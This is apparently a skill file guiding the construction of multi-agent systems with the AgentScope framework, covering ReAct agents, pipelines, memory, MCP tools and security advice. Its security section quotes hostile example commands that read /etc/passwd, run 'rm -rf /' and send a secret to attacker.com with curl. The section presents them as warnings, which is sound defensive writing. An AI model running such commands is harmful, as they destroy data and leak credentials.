---
name: agentscope
description: Build production-ready multi-agent systems with AgentScope framework. Use this skill when users want to create AI agents, multi-agent workflows, or distributed agent applications. Provides patterns for ReActAgent, MsgHub, Pipelines, MCP integration, memory management, and fault-tolerant agent systems.
---

# AgentScope Skill

Build production-ready multi-agent applications with Alibaba's AgentScope framework.

## When to Use This Skill

Use this skill when the user wants to:
- Create AI agents (ReActAgent, DialogAgent, custom agents)
- Build multi-agent workflows and orchestration
- Integrate MCP (Model Context Protocol) tools
- Implement memory systems (short-term, long-term)
- Deploy distributed multi-agent systems
- Use AgentScope's pipelines, MsgHub, or planning features

## Quick Start Pattern

```python
import asyncio
import os
from agentscope.agent import ReActAgent
from agentscope.model import DashScopeChatModel
from agentscope.formatter import DashScopeChatFormatter
from agentscope.memory import InMemoryMemory
from agentscope.tool import Toolkit
# SECURITY: Do NOT use execute_python_code or execute_shell_command
# in production - they allow arbitrary code execution

async def build_agent():
    toolkit = Toolkit()
    
    # SECURITY: Define safe custom tools instead of using execute_python_code
    def calculator(expression: str) -> float:
        """Safely evaluate basic math expressions."""
        import ast
        import operator
        ops = {
            ast.Add: operator.add,
            ast.Sub: operator.sub,
            ast.Mult: operator.mul,
            ast.Div: operator.truediv
        }
        tree = ast.parse(expression, mode='eval')
        def safe_eval(node):
            if isinstance(node, ast.Num):
                return node.n
            elif isinstance(node, ast.BinOp):
                return ops[type(node.op)](
                    safe_eval(node.left),
                    safe_eval(node.right)
                )
            raise ValueError("Unsupported operation")
        return safe_eval(tree.body)
    
    toolkit.register_tool_function(calculator)
    
    agent = ReActAgent(
        name="Assistant",
        sys_prompt="You are a helpful AI assistant.",
        model=DashScopeChatModel(
            model_name="qwen-max",
            api_key=os.environ["DASHSCOPE_API_KEY"],
            stream=True
        ),
        memory=InMemoryMemory(),
        formatter=DashScopeChatFormatter(),
        toolkit=toolkit
    )
    
    return agent
```

## Core Patterns

### Pattern 1: Simple Conversational Agent

**Use Case**: Chatbots, Q&A systems, simple assistants

```python
from agentscope.agent import DialogAgent

agent = DialogAgent(
    name="ChatBot",
    sys_prompt="You are a friendly conversational assistant.",
    model=DashScopeChatModel(model_name="qwen-max", api_key=api_key),
    memory=InMemoryMemory()
)

response = await agent(Msg(name="user", content="Hello!", role="user"))
```

**Reference**: See `references/agents.md` for all agent types.

### Pattern 2: Tool-Using Agent (ReAct)

**Use Case**: Task automation, code execution, web browsing

```python
from agentscope.agent import ReActAgent
from agentscope.tool import Toolkit

toolkit = Toolkit()

# SECURITY WARNING: Never use execute_shell_command or execute_python_code
# in production! They allow arbitrary code execution. Instead:
# 1. Define specific, safe tool functions
# 2. Use MCP tools from trusted sources
# 3. Implement input validation and sandboxing

def safe_file_read(filepath: str) -> str:
    """Read a file with path validation."""
    import os
    safe_dir = "/allowed/directory"
    abs_path = os.path.abspath(filepath)
    if not abs_path.startswith(safe_dir):
        raise ValueError("Access denied: path outside allowed directory")
    with open(abs_path, 'r') as f:
        return f.read()

toolkit.register_tool_function(safe_file_read)

agent = ReActAgent(
    name="Coder",
    sys_prompt="You help with coding tasks. Use tools when needed.",
    model=model,
    memory=InMemoryMemory(),
    formatter=DashScopeChatFormatter(),
    toolkit=toolkit,
    max_iters=10
)
```

**Reference**: See `references/tools-mcp.md` for custom tools and MCP integration.

### Pattern 3: Multi-Agent Pipeline

**Use Case**: Sequential workflows, parallel processing

```python
from agentscope.pipeline import sequential_pipeline, fanout_pipeline

# Sequential: agent1 -> agent2 -> agent3
result = await sequential_pipeline(
    agents=[researcher, analyzer, writer],
    msg=initial_msg
)

# Parallel: all agents process same input
results = await fanout_pipeline(
    agents=[sentiment_agent, entity_agent, summary_agent],
    msg=input_msg
)
```

**Reference**: See `references/pipelines.md` for orchestration patterns.

### Pattern 4: Multi-Agent Conversation (MsgHub)

**Use Case**: Group discussions, collaborative agents

```python
from agentscope.hub import MsgHub

async with MsgHub(
    participants=[agent1, agent2, agent3],
    announcement=Msg("user", "Discuss the topic...", "user")
) as hub:
    await agent1()  # Broadcasts to others
    await agent2()  # Broadcasts to others
    await agent3()  # Broadcasts to others
```

### Pattern 5: Custom Agent

**Use Case**: Specialized behavior, custom logic

```python
from agentscope.agent import AgentBase
from agentscope.message import Msg

class MyAgent(AgentBase):
    def __init__(self, name, model, **kwargs):
        super().__init__(name=name, **kwargs)
        self.model = model
        
    async def __call__(self, msg: Msg = None) -> Msg:
        if msg:
            self.memory.add(msg)
        
        response = await self.model(self.memory.get_memory())
        
        output = Msg(
            name=self.name,
            content=response.content,
            role="assistant"
        )
        self.memory.add(output)
        return output
```

**Reference**: See `references/agents.md` for custom agent patterns.

## Model Configuration

### Supported Providers

```python
from agentscope.model import (
    DashScopeChatModel,   # Qwen models
    OpenAIChatModel,       # GPT models
    AnthropicChatModel,    # Claude models
)

# Match formatter to model
from agentscope.formatter import (
    DashScopeChatFormatter,
    OpenAIChatFormatter,
    AnthropicChatFormatter,
)

# Example: DashScope (Qwen)
agent = ReActAgent(
    model=DashScopeChatModel(
        model_name="qwen-max",
        api_key=os.environ["DASHSCOPE_API_KEY"],
        stream=True
    ),
    formatter=DashScopeChatFormatter(),  # Match!
    ...
)
```

**Reference**: See `references/api_reference.md` for all model wrappers.

## Memory Systems

### Short-Term (Conversation History)

```python
from agentscope.memory import InMemoryMemory

memory = InMemoryMemory(
    max_messages=100,    # Limit by count
    summarization=True   # Auto-summarize old messages
)
```

### Long-Term (Cross-Session)

```python
from agentscope.memory import ReMeMemory

ltm = ReMeMemory(
    storage_path="./memory_store",
    embedding_model="text-embedding-v2"
)

# Search memories
results = await ltm.search(
    query="What did we discuss about Python?",
    top_k=5
)
```

**Reference**: See `references/memory.md` for memory patterns.

## MCP Integration

Connect to Model Context Protocol servers for extended tool ecosystems:

```python
from agentscope.tool import MCPToolkit

# StdIO transport (local server)
mcp_toolkit = MCPToolkit(
    server_name="filesystem",
    transport="stdio",
    command="python",
    args=["mcp_server.py"]
)

await mcp_toolkit.initialize()
tools = await mcp_toolkit.list_tools()

# Use with agent
agent = ReActAgent(name="agent", toolkit=mcp_toolkit, ...)
```

**Reference**: See `references/tools-mcp.md` for MCP patterns.

## Distributed Deployment

Convert local agents to distributed deployment:

```python
from agentscope.agent import to_dist_agent
import ray

ray.init(address="auto")  # Connect to cluster

local_agent = ReActAgent(name="worker", ...)
distributed_agent = to_dist_agent(local_agent)

# Use identically - framework handles distribution
result = await distributed_agent(msg)
```

**Reference**: See `references/distributed.md` for deployment patterns.

## Three-Stage Application Pattern

Production applications follow this structure:

```python
from agentscope.app import AgentApp

class MyApp(AgentApp):
    async def init(self):
        """Stage 1: Initialize resources"""
        self.agent = ReActAgent(...)
        self.toolkit = Toolkit()
        
    async def query(self, user_input: str):
        """Stage 2: Process requests"""
        msg = Msg(name="user", content=user_input, role="user")
        return await self.agent(msg)
        
    async def shutdown(self):
        """Stage 3: Cleanup resources"""
        await self.cleanup()
```

## Reference Files

Load these references for detailed information:

| File | Purpose |
|------|---------|
| `references/architecture.md` | Layered architecture, message flow |
| `references/agents.md` | Agent types, configuration, custom agents |
| `references/tools-mcp.md` | Toolkit, custom tools, MCP integration |
| `references/memory.md` | Short-term, long-term, ReMe, Mem0 |
| `references/pipelines.md` | Sequential, fanout, planning, routing |
| `references/distributed.md` | Actor-based deployment, scaling |
| `references/api_reference.md` | Model wrappers, formatters, APIs |

## Example Scripts

See `scripts/` directory for runnable examples:

- `example.py`: Basic ReActAgent with tools
- Additional examples in scripts folder

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────┐
│                    Application Layer                     │
│         (AgentApp, Workflows, User Interfaces)           │
├─────────────────────────────────────────────────────────┤
│                      Agent Layer                         │
│    (ReActAgent, DialogAgent, UserAgent, Custom)          │
├─────────────────────────────────────────────────────────┤
│                  Communication Layer                     │
│        (MsgHub, Messages, Pipelines, Planning)           │
├─────────────────────────────────────────────────────────┤
│                  Infrastructure Layer                    │
│  (Model Wrappers, Memory, Tools, MCP, Fault Tolerance)   │
└─────────────────────────────────────────────────────────┘
```

## Security Considerations

⚠️ **CRITICAL SECURITY WARNINGS**

### Dangerous Built-in Tools (DO NOT USE IN PRODUCTION)

AgentScope provides two built-in tools that pose severe security risks:

| Tool | Risk | Recommendation |
|------|------|----------------|
| `execute_shell_command` | **Critical**: Arbitrary shell command execution | Never use in production |
| `execute_python_code` | **Critical**: Arbitrary Python code execution | Never use in production |

### Why These Tools Are Dangerous

```python
# ❌ DANGEROUS - Do NOT use
toolkit.register_tool_function(execute_shell_command)
toolkit.register_tool_function(execute_python_code)

# An attacker could:
# - Read sensitive files: execute_shell_command("cat /etc/passwd")
# - Delete data: execute_python_code("import os; os.system('rm -rf /')")
# - Exfiltrate data: execute_shell_command("curl attacker.com/steal?data=$(cat secret)")
```

### Safe Alternatives

Instead of dangerous built-in tools, implement specific, validated operations:

```python
# ✅ SAFE - Specific tool with validation
def read_allowed_file(filename: str) -> str:
    """Read a file from allowed directory with validation."""
    import os
    
    # Validate filename (no path traversal)
    if ".." in filename or "/" in filename or "\\" in filename:
        raise ValueError("Invalid filename")
    
    # Restrict to allowed directory
    allowed_dir = "/data/allowed"
    filepath = os.path.join(allowed_dir, filename)
    
    # Validate extension
    if not filename.endswith((".txt", ".json", ".md")):
        raise ValueError("Unsupported file type")
    
    with open(filepath, 'r') as f:
        return f.read()

toolkit.register_tool_function(read_allowed_file)
```

### Security Best Practices

1. **Principle of Least Privilege**: Only provide tools the agent needs
2. **Input Validation**: Validate all inputs before processing
3. **Sandbox Sensitive Operations**: Use containers, restricted environments
4. **Audit Tool Usage**: Log all tool invocations
5. **Use MCP Tools**: Prefer well-audited MCP server tools over custom implementations
6. **Never Expose Shell/Code Execution**: Even with "validation", these are too risky

### Mitigating Indirect Prompt Injection

When using tools that fetch content from external sources (`web_search`, `web_fetch`), be aware of the risk of indirect prompt injection. Malicious content on a webpage could try to trick the agent into performing unintended actions.

**Mitigation Strategies:**
- **Skeptical Agent Prompting**: Instruct your agent to be skeptical of instructions found in web content and to seek confirmation before performing sensitive actions.
- **User Confirmation**: For critical actions (e.g., making a purchase, sending an email), implement a user confirmation step before execution.
- **Restrictive Tool Permissions**: Limit the permissions of the tools available to the agent. Don't give an agent that browses the web the ability to execute shell commands.

### Report: Socket Security Analysis

A security audit identified critical vulnerabilities in template code:

- **Finding 1**: `execute_shell_command` allowed arbitrary command execution
- **Finding 2**: `execute_python_code` allowed arbitrary code execution
- **Status**: All templates updated to use safe alternatives

For detailed security guidance, see `references/tools-mcp.md`.

## Best Practices

1. **Always use async/await** when calling agents
2. **Match formatter to model** for correct message formatting
3. **Set max_iters for ReActAgent** to prevent infinite loops
4. **Use memory** for maintaining conversation context
5. **Register tools before** passing toolkit to agent
6. **Prefer MCP tools** for external integrations
7. **Use sequential_pipeline** for dependent steps
8. **Use fanout_pipeline** for parallel independent analysis

## Resources

- **GitHub**: https://github.com/agentscope-ai/agentscope
- **Documentation**: https://doc.agentscope.io
- **PyPI**: `pip install agentscope`
- **ReMe Memory**: https://github.com/agentscope-ai/ReMe
